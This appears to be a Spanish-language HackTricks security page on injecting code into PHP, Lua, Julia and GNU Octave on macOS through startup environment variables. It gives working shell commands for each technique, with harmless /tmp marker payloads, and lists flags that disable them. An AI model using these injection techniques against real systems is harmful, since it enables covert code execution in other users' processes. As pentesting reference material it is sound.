# Inyección de archivos de inicio del intérprete de macOS

{{#include ../../../banners/hacktricks-training.md}}

Estas técnicas específicas del runtime usan variables de entorno heredadas para seleccionar una configuración de inicio o código antes de ejecutar el script previsto. Lua también admite una variante con código en línea.

## Configuración de inicio de PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` y `auto_prepend_file`

PHP CLI y CGI leen la configuración en cada ejecución. `PHPRC` puede seleccionar un archivo `php.ini` legible por el atacante, mientras que `PHP_INI_SCAN_DIR` puede redirigir el directorio en el que se buscan archivos `.ini` adicionales. La directiva `auto_prepend_file` hace que PHP analice un archivo antes del script solicitado, por lo que esta combinación permite ejecutar código durante el inicio.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Una alternativa es un directorio que contiene un archivo `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

La opción `-n` ignora `php.ini`; una ruta explícita y confiable indicada con `-c` tiene prioridad sobre `PHPRC`. Recuerda que un SAPI de servidor de larga duración normalmente lee la configuración cuando se inicia el servidor web, mientras que CLI y CGI lo hacen en cada invocación.<sup>[[1]](#references)</sup>

## Código de inicio de Lua

### `LUA_INIT`

Antes de procesar las opciones de línea de comandos o el script de destino, el intérprete independiente de Lua ejecuta `LUA_INIT_<major>_<minor>` o, si la variable versionada no está definida, `LUA_INIT`. Un valor que comienza con `@` indica un archivo; cualquier otro valor se evalúa directamente como código Lua. Esto permite ejecutar código de inicio tanto desde un archivo como sin archivo.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

El nombre exacto con versión cambia según el intérprete; por ejemplo, `LUA_INIT_5_4`. `lua -E` ignora todas las variables de entorno, incluido el código de inicio y las rutas de módulos de Lua.

## Depot de inicio de Julia

### `JULIA_DEPOT_PATH` y `startup.jl`

Julia normalmente ejecuta `config/startup.jl` desde su primer depot al iniciarse. `JULIA_DEPOT_PATH` controla la lista de depots, así que apuntarlo a un árbol legible por un atacante redirige el archivo de inicio que se carga automáticamente.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

El separador final es útil si la víctima aún necesita sus paquetes habituales. `julia --startup-file=no` desactiva este archivo de inicio. Borra la variable antes del lanzamiento, porque también controla los registros de paquetes, los entornos, las cachés y las ubicaciones de carga de código.

## Archivos de inicio de GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave ejecuta durante el inicio varios archivos que contienen comandos válidos de Octave. `OCTAVE_SITE_INITFILE` reemplaza el archivo de inicio de todo el sitio y `OCTAVE_VERSION_INITFILE` reemplaza el específico de la versión, lo que permite que cualquiera de las dos variables redirija la ejecución automática a un archivo que el atacante pueda leer.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` solo omite los archivos del usuario, como `~/.octaverc`; **no** impide la anulación del archivo del sitio anterior. Usa `--no-site-file` para los archivos del sitio, o `--norc` / `-f` para desactivar todos los archivos de inicio.<sup>[[7]](#references)</sup>

## References

- [1] [Archivo de configuración de PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Intérprete independiente de Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfaz de línea de comandos de Julia: archivo de inicio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variables de entorno de Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Archivos de inicio de GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opciones de línea de comandos de GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
